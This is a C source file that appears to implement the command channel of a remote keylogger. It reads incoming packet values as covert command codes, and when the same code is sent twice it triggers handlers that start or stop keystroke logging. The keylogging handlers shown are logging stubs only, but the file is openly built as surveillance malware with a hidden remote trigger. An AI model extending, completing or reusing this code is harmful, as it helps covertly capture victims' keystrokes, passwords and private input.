#include "protocol.h"
#include "utils/utils.h"
#include <stdio.h>
#include <stdlib.h>


void handle_command_codes(struct session_info * session_info, const uint16_t data) {
    enum command_codes encountered_command_code = {};
    bool is_command_code = true;

    switch (data) {
        case START_KEYLOGGER:
            log_message("Start Keylogger\n");
            encountered_command_code = START_KEYLOGGER;
            break;
        case STOP_KEYLOGGER:
            log_message("Stop Keylogger\n");
            encountered_command_code = STOP_KEYLOGGER;
            break;
        default:
            log_message("Default\n");
            is_command_code = false;
            break;
    }

    if (is_command_code) {
        if (session_info->last_command_code == encountered_command_code) {
            session_info->command_counter++;
        } else {
            session_info->last_command_code = encountered_command_code;
            session_info->command_counter = 1;
        }

        log_message("Session info counter: %d, code: %d", session_info->command_counter, encountered_command_code);

        // If the counter hits 2 then execute the corresponding function
        if (session_info->command_counter >= COMMAND_TRIGGER_THRESHOLD) {
            log_message("Triggered function call: counter %d, code: %d", session_info->command_counter, encountered_command_code);
            session_info->command_counter = 0;
            for (int i = 0; command_handler_functions[i].key != 0; i++) {
                if (command_handler_functions[i].key == encountered_command_code) {
                    command_handler_functions[i].handler(session_info);
                    return;
                }
            }
        }

    }
}

void handle_packet_data(struct session_info * session_info, const uint16_t data) {
    if (session_info->packet_index == 0) {
        handle_command_codes(session_info, data);
        session_info->head->data = data;
        session_info->packet_index++;
        return;
    }

    struct packet_data * packet_data = session_info->head;

    // Traverse to the last filled node
    while (packet_data->next != NULL) {
        packet_data = packet_data->next;
    }

    // Add data
    packet_data->next = malloc(sizeof(struct packet_data));
    packet_data->next->data = data;
    packet_data->next->next = NULL;
    session_info->packet_index++;

    handle_command_codes(session_info, data);

}


void start_keylogger(struct session_info * session_info) {
    log_message("Starting Keylogger");
}

void stop_keylogger(struct session_info * session_info) {
    log_message("Stoping Keylogger");
    session_info->run_keylogger = false;
}